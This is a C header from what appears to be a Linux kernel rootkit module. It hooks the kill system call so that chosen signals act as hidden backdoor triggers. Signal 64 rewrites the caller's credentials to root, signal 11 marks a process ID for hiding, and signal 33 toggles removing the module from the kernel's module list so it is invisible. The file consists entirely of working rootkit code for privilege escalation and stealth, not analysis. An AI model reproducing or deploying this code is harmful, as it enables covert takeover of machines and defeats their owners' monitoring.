#ifndef KILL_H
#define KILL_H

/*
    Aye we can hide this module with kill -33 1 and vise versa to add the module back to the list with the same command, acting as a switch.
*/

static struct list_head *prev_module;
static short hidden = 0;

static void set_root(void);
static void hideme(void);
static void showme(void);

static asmlinkage long (*og_kill)(const struct pt_regs *regs);

static asmlinkage int hooked_kill(const struct pt_regs *regs);

static notrace asmlinkage int hooked_kill(const struct pt_regs *regs) {
 
  void set_root(void);
  void showme(void);
  void hideme(void);

 pid_t pid = regs->di;

 int sig = regs->si;

 if (sig == 64) {
   set_root();
   return 0;
 }

  if (sig == 11) {
   printk(KERN_INFO "rasta : hiding proc with PID -> %d\n", pid); // Dont worry this is hidden.
   sprintf(hide_pid, "%d", pid);
 } 

 if ((sig == 33) && (hidden == 0)) {
   hideme();
   hidden = 1;
 }
 else if ((sig == 33) && (hidden == 1)) {
   showme();
   hidden = 0;
 }

 else {
   return og_kill(regs);
 }

 return 0;
}

static void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

static void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

#endif
